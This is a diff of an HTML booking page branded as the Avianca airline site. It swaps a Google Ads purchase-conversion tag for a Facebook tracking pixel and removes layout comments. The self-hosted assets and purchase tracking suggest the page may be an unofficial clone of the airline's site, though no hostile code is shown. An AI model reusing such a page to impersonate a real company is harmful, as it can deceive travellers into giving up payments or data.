@@ -1,22 +1,21 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-16966659471"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'AW-16966659471');
-</script>
-    <!-- Event snippet for Compra conversion page -->
-<script>
-  gtag('event', 'conversion', {
-    'send_to': 'AW-16966659471/XfcyCOGv7bIaEI_bqpo_',
-    'transaction_id': ''
-  });
-</script>
+    <script>
+        !function(f,b,e,v,n,t,s)
+        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+        n.queue=[];t=b.createElement(e);t.async=!0;
+        t.src=v;s=b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t,s)}(window, document,'script',
+        'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '1336585420999046');
+        fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1336585420999046&ev=PageView&noscript=1"
+    /></noscript>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Avianca - Find cheap tickets and flights</title>
@@ -30,7 +29,6 @@
     <link rel="stylesheet" href="./css/normalize.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jsrsasign/10.1.0/jsrsasign-all-min.js"></script>
 
-    <!-- ✅ limpiar localStorage al cargar -->
     <script>
       window.addEventListener("load", function() {
         localStorage.clear();
@@ -38,17 +36,14 @@
       });
     </script>
 
-    <!-- START -->
     <script src="./js/functions.js"></script>
 </head>
 <body class="sb-hidden">
 
-    <!-- ON LOADER -->
     <div class="loader show">
         <img src="./assets/svg/plane-loader.gif">
     </div>
 
-    <!-- ON CONVERS | DESTINATIONS -->
     <div class="cover" id="cover-destinations">
         <div class="cover--main">
             <div class="cover--header">
@@ -68,7 +63,6 @@
         </div>
     </div>
 
-    <!-- ON COVER | FLIGHT RESUME -->
     <div class="cover" id="cover-resume">
         <div class="cover--main">
             <div class="cover--header">
@@ -109,7 +103,6 @@
         </div>
     </div>
 
-    <!-- ON COVER | PASSENGERS -->
     <div class="cover" id="cover-passengers">
         <div class="cover--main">
             <div class="cover--header">
@@ -169,7 +162,6 @@
         </div>
     </div>
 
-    <!-- NAVBAR -->
     <nav class="navbar">
         <img class="navbar-hmenu" src="./assets/svg/hamburger_menu.png" alt="menu_h">
         <div class="navbar--logo">
@@ -250,7 +242,6 @@
         </div>
     </section>
 
-    <!-- FOOTER -->
     <footer class="footer">
         <div class="footer--main">
             <div class="footer--logo">
@@ -276,7 +267,6 @@
         </div>
     </footer>
 
-    <!-- SCRIPTS -->
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
     <script src="./js/calendar.js"></script>
     <script src="./js/index.js"></script>
